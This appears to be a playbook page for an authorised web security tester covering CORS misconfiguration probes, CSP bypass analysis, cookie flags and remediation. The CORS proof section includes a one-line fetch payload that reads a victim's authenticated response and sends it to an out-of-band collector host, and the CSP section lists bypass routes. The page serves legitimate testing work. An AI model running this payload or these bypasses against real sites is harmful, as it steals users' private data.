# Security headers, cookies, CORS and CSP

**Class:** configuration / client-side  **Updated:** 2026-11-13

## What it is
Headers decide what a browser lets a cross-origin page read (CORS), what
script may run on the target (CSP), and which requests carry cookies
(`SameSite`, prefixes). Most header findings are hardening notes. Two are
real vulnerabilities when proven: a CORS policy that lets an attacker origin
read authenticated responses, and a CSP bypass that turns an existing HTML
injection into script execution.

## How Mythos detects it
- `scripts/probe` already collects `access-control-allow-origin`,
  `-credentials`, `content-security-policy`, `strict-transport-security`,
  `x-content-type-options` and `Set-Cookie` flags per page. That is the
  passive layer; zero risk, always run.
- Active CORS and CSP checks below, on the endpoints that return sensitive
  data to `userA` (profile, tokens, billing), not on static assets.

## CORS
A request from `https://evil.example` that reads a response needs
`Access-Control-Allow-Origin` (ACAO) naming that origin, and for cookies
also `Access-Control-Allow-Credentials: true` (ACAC). `*` cannot be combined
with credentials in a browser.

Send each `Origin` to a sensitive endpoint as `userA` and record ACAO, ACAC
and `Vary`:

| `Origin` sent | trust flaw it reveals |
|---|---|
| `https://evil.example` | arbitrary reflection |
| `null` | `null` allowed (sandboxed iframe, `data:` and `file:` pages send it) |
| `https://target.example.evil.example` | prefix match / `startsWith` |
| `https://eviltarget.example` | unanchored regex or `endsWith` |
| `https://targetXexample` | unescaped dot in a regex |
| `http://target.example` | scheme not checked |
| `https://x.target.example` | every subdomain trusted (any subdomain XSS or takeover becomes a read primitive) |
| `https://target.example:1337` | port not checked |

Method: reflection of the sent origin is the signal, not a fixed value. A
policy that answers the same ACAO for every origin is a static allow, a
different finding. Also send an `OPTIONS` preflight with
`Access-Control-Request-Method` and `-Headers`; note whether it reflects them
and the `Access-Control-Max-Age`.

**What each outcome is worth**
| result | worth |
|---|---|
| reflected or `null` ACAO + `ACAC: true`, endpoint returns private data, session cookie sendable cross-site | high: attacker page reads the victim's data |
| same, but session cookie is `SameSite=Lax` (default) and attacker is cross-site | cookie not sent; low until the attacker is same-site or cookie is `None` |
| reflected ACAO, no ACAC, data public | none |
| reflected or `*` ACAO, no ACAC, endpoint reachable only from an internal network | medium: a victim's browser becomes a proxy into the intranet |
| bearer-token API, ACAC irrelevant | none unless the token is in a cookie or the page leaks it |
| trusts all subdomains | chain only; needs a subdomain bug |

**Vary.** If ACAO changes with `Origin` but `Vary: Origin` is absent and the
response is cacheable, a shared cache can store the ACAO for one origin and
serve it to others (poisoning; test with a cache buster per
`cache-poisoning.md`), or break legitimate use. Report as its own note.

**Proof.** curl shows headers: `candidate`. A real cross-site read needs a
browser on another site (hosting and cookie rules as in
`csrf-websocket-clickjacking.md`): the PoC page does
`fetch(url,{credentials:'include'}).then(r=>r.text()).then(t=>new Image().src=OAST+'/<token>?m='+encodeURIComponent(t.slice(0,60)))`.
Evidence: the OAST log line carrying a marker that exists only in `userA`'s
data, with the browser and cookie attributes noted. Controls: same PoC from a
non-allowed origin fails; same PoC in a session-less context carries no marker.
For `null`, run the fetch from `<iframe sandbox="allow-scripts" srcdoc=...>`.
Never read a third party's data.

## CSP analysis procedure
A CSP bypass is a chain link. Without an injection point it is hardening.
1. **Get the enforced policy.** Header and `<meta http-equiv>`, per page and
   per login state. `Content-Security-Policy-Report-Only` does not enforce.
2. **Is script restricted?** No `script-src` and no `default-src`: no script
   restriction. Read directive fallbacks (`default-src` covers what is not set).
3. **Weak source expressions:** `'unsafe-inline'` (ignored when a nonce or
   hash is also present), `'unsafe-eval'`, `*`, `https:`, `data:`, `blob:`,
   wildcard subdomains.
4. **Allowlisted hosts that serve attacker content:** JSONP endpoints, old
   Angular, CDNs that serve arbitrary npm or GitHub packages
   (`cdn.jsdelivr.net`, `unpkg.com`), user-content or storage buckets.
   Allowlist-based policies are usually bypassable (Weichselbaum et al., CCS 2016).
5. **Nonce quality:** fetch the page twice; the nonce must differ per
   response. A static or cached nonce is no nonce.
6. **Missing directives:** `base-uri` (injected `<base>` redirects relative
   script loads, defeating nonces), `form-action` (form-based exfiltration),
   `object-src`, `frame-ancestors` (clickjacking), `connect-src`/`img-src`
   (exfil channels).
7. **Prove it in the browser** (`mythos-browser`), under the real policy: with
   a real HTML injection point, inject the bypass payload, expect a marker
   and an OAST hit, and check the console for a CSP violation versus execution.
   Evaluate policies locally; do not paste an engagement's policy into
   third-party evaluators.

Worth: policy weakness alone is informational. With a proven HTML injection
it moves "content injection" to "script execution": report the pair, not the
policy. A missing CSP is informational unless an injection exists.

## Cookies and other headers
Session cookie without `HttpOnly` matters with an XSS; without `Secure`
matters without HSTS; without `SameSite` see CSRF. Prefer `__Host-` prefix.
Missing `X-Content-Type-Options`, `Referrer-Policy`, HSTS: hardening, one line
in the report, no severity beyond low.

## What does not count as proof
ACAO reflected with no ACAC on public data; `*` on a static asset; a CSP with
`'unsafe-inline'` and no injection; a header seen only in curl for a
cross-site claim; a missing header on a page with no sensitive action.

## Remediation
CORS: explicit allowlist, exact match, no `null`, `Vary: Origin`, credentials
only where needed. CSP: nonce or hash with `'strict-dynamic'`, `base-uri
'none'`, `object-src 'none'`, `frame-ancestors`. Cookies: `Secure; HttpOnly;
SameSite`, `__Host-` prefix, HSTS.

## Sources
- WHATWG Fetch Standard, CORS protocol (living standard)
- Kettle, "Exploiting CORS misconfigurations for Bitcoins and bounties",
  PortSwigger Research (2016-10)
- Weichselbaum, Spagnuolo, Lekies, Janc, "CSP Is Dead, Long Live CSP!", ACM CCS 2016
- PortSwigger Web Security Academy, CORS; MDN, Content-Security-Policy
- OWASP Secure Headers Project; WSTG-CLNT-07
